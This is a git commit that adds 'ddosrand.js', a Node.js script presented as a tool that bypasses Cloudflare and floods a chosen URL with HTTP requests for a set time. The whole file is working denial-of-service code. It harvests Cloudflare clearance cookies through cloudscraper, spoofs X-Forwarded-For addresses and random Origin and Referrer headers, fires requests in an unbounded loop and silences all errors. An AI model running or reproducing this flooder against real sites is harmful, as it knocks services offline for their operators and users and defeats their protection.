d3737cc215151a39978f802ac8ce5cd2b7bf238e
IBteesam <83177878+ibteesam@users.noreply.github.com>
2022-08-07 00:14:13 +0700

    Add files via upload

---
+++ ddosrand.js
@@ -0,0 +1,71 @@
+var colors = require('colors');
+const cloudscraper = require('cloudscraper');
+const request = require('request');
+const randomstring = require('randomstring');
+if (process.argv.length !== 4){
+console.log("Bypass CF by Chaos !")
+console.log("node ddosrand.js url time");
+process.exit(0);
+}
+var url = process.argv[2];
+var time = process.argv[3];
+function main_process(){
+var cookie = '';
+var useragent = '';
+var color = [colors.green,colors.underline.red,colors.rainbow,colors.trap]
+function main(){
+var colors = color[Math.floor(Math.random()*color.length)];
+cloudscraper({url:url,method:"get",resolveWithFullResponse: true},function(e,r,b){
+if (e){
+console.log('Host Error !!!!')}
+var parsed = JSON.parse(JSON.stringify(r));
+useragent = (parsed['request']['headers']['User-Agent'])
+cookie = (parsed['request']['headers']['cookie'])
+if(cookie == undefined){
+cookie = (parsed['headers']['set-cookie'])
+}
+//console.log(cookie,useragent)
+var char = randomstring.generate({
+length:10,
+charset:'abcdefghijklmnopqstuvwxyz0123456789'
+})
+//console.log(char)
+ipq = function ranip(){
+return Math.round(Math.random()*256)
+}
+var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
+//console.log(ip)
+var config = {
+url:url,
+method:'get',
+headers:{
+'User-Agent': useragent,
+'Upgrade-Insecure-Requests': '1',
+'cookie': cookie,
+'Origin': 'http://' + char + '.com',
+'Referrer': 'http://google.com/' + char,
+'X-Forwarded-For': ip
+}
+}
+
+request(config,function(e,r){
+console.log(colors(r.statusCode+" "+"Attack !"));
+if(r.statusCode != 200){
+request(config)}
+else{
+request(config)
+}
+})
+})
+}
+setInterval(()=>{main()})
+setTimeout(()=>{process.exit()},time*1000)
+}
+main_process()
+process.on('uncaughtException', function(err) {
+    
+});
+
+process.on('unhandledRejection', function(err) {
+    
+});
